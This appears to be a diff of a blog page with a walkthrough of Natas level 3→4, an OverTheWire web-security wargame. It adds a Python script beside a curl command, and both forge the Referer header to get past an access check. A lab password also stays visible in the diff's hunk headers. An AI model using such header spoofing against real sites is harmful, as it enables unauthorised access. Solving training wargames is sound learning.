@@ -12,8 +12,8 @@
     <link rel="icon" href="/favicon.ico?" type="image/x-icon">
     <link rel="stylesheet" href="https://cdnjs.Cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
     <link rel="stylesheet" href="/assets/css/main.min.css ">
-    <link rel="canonical" href="https://caminek.rocks/2021/05/23/natas03-04/">
-    <link rel="alternate" type="application/rss+xml" title="Caminek" href="https://caminek.rocks/feed.xml ">
+    <link rel="canonical" href="/2021/05/23/natas03-04/">
+    <link rel="alternate" type="application/rss+xml" title="Caminek" href="/feed.xml ">
     
     <!-- Begin Jekyll SEO tag v2.7.1 -->
 <title>Natas Level 3 → Level 4 | Caminek</title>
@@ -22,15 +22,15 @@
 <meta property="og:locale" content="en_US" />
 <meta name="description" content="Referrer madness" />
 <meta property="og:description" content="Referrer madness" />
-<link rel="canonical" href="https://caminek.rocks/2021/05/23/natas03-04/" />
-<meta property="og:url" content="https://caminek.rocks/2021/05/23/natas03-04/" />
+<link rel="canonical" href="/2021/05/23/natas03-04/" />
+<meta property="og:url" content="/2021/05/23/natas03-04/" />
 <meta property="og:site_name" content="Caminek" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2021-05-23T15:09:25-04:00" />
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="Natas Level 3 → Level 4" />
 <script type="application/ld+json">
-{"@type":"BlogPosting","description":"Referrer madness","headline":"Natas Level 3 → Level 4","dateModified":"2021-05-23T15:09:25-04:00","datePublished":"2021-05-23T15:09:25-04:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://caminek.rocks/2021/05/23/natas03-04/"},"url":"https://caminek.rocks/2021/05/23/natas03-04/","@context":"https://schema.org"}</script>
+{"@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/2021/05/23/natas03-04/"},"description":"Referrer madness","headline":"Natas Level 3 → Level 4","dateModified":"2021-05-23T15:09:25-04:00","url":"/2021/05/23/natas03-04/","datePublished":"2021-05-23T15:09:25-04:00","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -207,22 +207,36 @@ Access disallowed. You are visiting from "" while authorized users should come o
 &lt;div id="viewsource"&gt;&lt;a href="index.php"&gt;Refresh page&lt;/a&gt;&lt;/div&gt;
 &lt;/div&gt;
 </code></pre></div></div>
-<p>You can solve this using <a href="Burp Suite">https://portswigger.net/burp</a> or one of the many browser addons to forger referrer headers. I opted to solve this with curl. I ran into Java issues while trying to run Burp and didn’t want to deal with them at this time.</p>
+<p>You can solve this using <a href="https://portswigger.net/burp">Burp Suite</a> or one of the many browser add-ons to forger referrer headers. I opted to solve this with curl. I ran into Java issues while trying to run Burp and didn’t want to deal with them at this time.</p>
 
-<p>Free free to use any method you’d like, just be certain to include the trailing slash in the referrer address or you wont be able to access the site.</p>
+<p>Free free to use any method you’d like, just be certain to include the trailing slash in the referrer address or you won’t be able to access the site.</p>
 
 <p>Here’s the curl solution:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-u</span> natas4:Z------------------------------Z <span class="nt">-e</span> http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/
 ...
 &lt;div <span class="nb">id</span><span class="o">=</span><span class="s2">"content"</span><span class="o">&gt;</span>
 
-Access granted. The password <span class="k">for </span>natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+Access granted. The password <span class="k">for </span>natas5 is i------------------------------q
 &lt;br/&gt;
 &lt;div <span class="nb">id</span><span class="o">=</span><span class="s2">"viewsource"</span><span class="o">&gt;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"index.php"</span><span class="o">&gt;</span>Refresh page&lt;/a&gt;&lt;/div&gt;
 &lt;/div&gt;
 ...
 </code></pre></div></div>
 
+<p>Here’s the Python 3 version of the above:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">from</span> <span class="nn">requests.auth</span> <span class="kn">import</span> <span class="n">HTTPBasicAuth</span>
+
+<span class="n">password</span> <span class="o">=</span> <span class="s">'Z------------------------------Z'</span>
+<span class="n">auth</span> <span class="o">=</span> <span class="n">HTTPBasicAuth</span><span class="p">(</span><span class="s">'natas4'</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s">'http://natas4.natas.labs.overthewire.org/index.php'</span>
+<span class="n">ref</span> <span class="o">=</span> <span class="s">'http://natas5.natas.labs.overthewire.org/'</span>
+
+<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="n">auth</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'referer'</span><span class="p">:</span> <span class="n">ref</span><span class="p">})</span>
+<span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div></div>
 
         </article>
         <hr>
@@ -273,6 +287,14 @@ Access granted. The password <span class="k">for </span>natas5 is iX6IOfmpN7AYOQ
                      <!--for loop is 0 based. this prevents off-by-one errors -->
                     
 
+                    
+                        
+
+                        
+                    
+                        
+
+                        
                     
                         
 
@@ -636,15 +658,15 @@ Access granted. The password <span class="k">for </span>natas5 is iX6IOfmpN7AYOQ
                 </div>
                 <ul class="content-ul" recent>
                     
+                        <li><a href="/2021/05/31/natas26-27/">Natas Level 26 → Level 27</a></li>
+                    
+                        <li><a href="/2021/05/31/natas25-26/">Natas Level 25 → Level 26</a></li>
+                    
                         <li><a href="/2021/05/30/natas24-25/">Natas Level 24 → Level 25</a></li>
                     
                         <li><a href="/2021/05/30/natas23-24/">Natas Level 23 → Level 24</a></li>
                     
                         <li><a href="/2021/05/30/natas22-23/">Natas Level 22 → Level 23</a></li>
-                    
-                        <li><a href="/2021/05/30/natas21-22/">Natas Level 21 → Level 22</a></li>
-                    
-                        <li><a href="/2021/05/30/natas20-21/">Natas Level 20 → Level 21</a></li>
                     
                 </ul>
             </div>
@@ -680,7 +702,7 @@ Access granted. The password <span class="k">for </span>natas5 is iX6IOfmpN7AYOQ
                             <span class="name">
                                 ctf
                             </span>
-                            <span class="badge">66</span>
+                            <span class="badge">68</span>
                         </a>
                     </li>
                     
@@ -689,7 +711,7 @@ Access granted. The password <span class="k">for </span>natas5 is iX6IOfmpN7AYOQ
                             <span class="name">
                                 wargames
                             </span>
-                            <span class="badge">61</span>
+                            <span class="badge">63</span>
                         </a>
                     </li>
                     
@@ -707,7 +729,7 @@ Access granted. The password <span class="k">for </span>natas5 is iX6IOfmpN7AYOQ
                             <span class="name">
                                 web-security
                             </span>
-                            <span class="badge">26</span>
+                            <span class="badge">28</span>
                         </a>
                     </li>
                     
